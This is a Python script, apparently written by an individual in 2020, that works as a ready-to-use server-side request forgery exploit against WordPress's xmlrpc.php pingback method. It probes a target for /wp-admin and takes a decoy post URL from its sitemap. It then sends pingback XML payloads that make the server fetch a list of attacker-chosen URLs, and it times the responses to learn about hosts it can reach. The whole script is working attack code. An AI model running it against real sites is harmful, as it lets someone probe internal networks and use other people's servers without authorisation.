#Written by Aaron, 10/10/2020

#This code goes after the xmlrpc vulnerability where it the pingback function of
#the API can be used to 
import requests
import time
import untangle
import sys

auto = False
print("=== WORDPRESS SERVER SIDE REQUEST FORGERY EXPLOIT ON XMLRPC.PHP ===")
try :
    targetDomain = sys.argv[1]
    requestUrls = open(sys.argv[2],"r").readlines()
    print("TARGET DOMAIN SET AS {0}".format(targetDomain))
    print("SET TO AUTOMATIC, WILL EXIT ON ERROR AND NOT REQUEST USER GUIDANCE")
    auto = True
    #This variable can tell the code if to exit when it finds something wrong automaticly
except IndexError:
    targetDomain = input("ENTER TARGET DOMAIN WITH NO PROTOCOL OR PATH INCLUDED -> ")
    requestsFile = input("ENTER THE URL FOR THE FILE TO READ REQUEST URLS FROM -> ")
    requestUrls = open(requestsFile, "r").readlines()
    auto = False

print("TOTAL OF {0} URLS TO SEND TO API".format(len(requestUrls)))

headers = {"user-agent": "Firefox"}
#This shouldn't be required, unless it stops bots

payload = """<?xml version=\"1.0\" encoding=\"utf-8\"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
 <param>
   <value>
        <string>{0}</string>
    </value>
  </param>
  <param>
    <value>
        <string>{1}</string>
    </value>
  </param>
</params>
</methodCall>"""

#Send a get request to the admin panel
print("\n\n=== CHECKING FOR ADMIN PANEL ===")
adminPanel = requests.get("http://" + targetDomain + "/wp-admin")
#Somes times it returns a 500, sometimes it's a redirect to
#wp-admin.php, any that's not a 404 work

if(adminPanel.status_code != 404):
    print("PAGE RUNS WORDPRESS")
    print("STATUS CODE RETURNED : {0}".format(str(adminPanel.status_code)))
else :
    print("STATUS CODE 404 WAS RETURNED")
    print("PROBABLY NOT A WORDPRESS PAGE")
    if not auto :
        input("PRESS ENTER TO CONTINUE SCRIPT OR CTRL + C TO QUIT")
    else :
        exit()

postUrl = ""
#This is blank to check for errors
print("\n\n=== SCANNING SITEMAP ===")
sitemap = requests.get("http://" + targetDomain + "/sitemap.xml")
if(sitemap.status_code != 404):
    print("SITEMAP AVALIABLE")
    print("SCANNING FOR POSTS")
    locations = untangle.parse(sitemap.text)
    for child in locations.sitemapindex.sitemap :
        if "post" in child.loc.cdata:
            print("POST SITEMAP FOUND : {0}".format(child.loc.cdata))
            postSitemap = requests.get(child.loc.cdata)
            #Send another requests to that sitemap

            print("SITEMAP REQUEST RETURNED {0}".format(postSitemap.status_code))
            postUrlsToUse = untangle.parse(postSitemap.text)
            postUrl = postUrlsToUse.urlset.url[0].loc.cdata
            print("DECOY URL SET TO {0}".format(postUrl))
            break
            #Most sitemaps follow this schema, it's consistant so search engines can
            #easily read it and log it
    if(postUrl == "" and not auto):
        input("THE CODE COULD NOT FIND A POST URL, PLEASE COPY AND PASTE ONE -> ")
        #We shouldn't get here really unless it encountered some sort of error
    elif(postUrl == "" and auto):
        exit()
else :
    if not auto:
        input("THE CODE COULD NOT FIND A POST URL BECAUSE OF LACK OF SITE MAP, PLEASE COPY AND PASTE ONE -> ")
    else :
        exit()
    #Almost every wordpress site has a sitemap.xml at the root, sometimes you will be redirected to
    #wp-sitemap.xml but the requests module really doesn't care if it gets a 300, it just follows anyway

#I want a system to check if pingback is avaliable, but wordpress is not always accurate with error messages
#and will say pingbacks might be disabled if the URL is malformed or pingbacks are actually disabled, it would
#be easier for the user to view the text after the script is finished to see if it worked

print("\n\n=== BEGGINING REQUESTING URLS FROM THE API ===")
targetUrl = "https://" + targetDomain + "/xmlrpc.php"
for request in requestUrls :
    if not request.startswith("http"):
        request = "http://" + request
    response = requests.post(targetUrl, data = payload.format(request, postUrl), headers = headers)
    print("TRYING {0} NOW".format(request.strip()))
    try :
        xml = untangle.parse(response.text)
        errorMessage = xml.methodResponse.fault.value.struct.member[1].value.cdata
        if (errorMessage == ""):
            #No error message
            print("NO ERROR RETURNED, TIME TO WAIT WAS {0}".format(response.elapsed))
        else :
            print("ERROR STRING RETURNED -> " + errorMessage + " TIME TO WAIT WAS {0}".format(response.elapsed))
    except : #xml.parsers.expat.ExpatError :
        print("AN ERROR OCCURED IN PROCESSING THE XML -> {0}, SERVER RETURNED {1}. TIME TO WAIT WAS {2}".format(sys.exc_info()[1], response.status_code, response.elapsed))
        #sys.stderr.write(response.text) #If you're getting weird error codes
    #time.sleep(5)
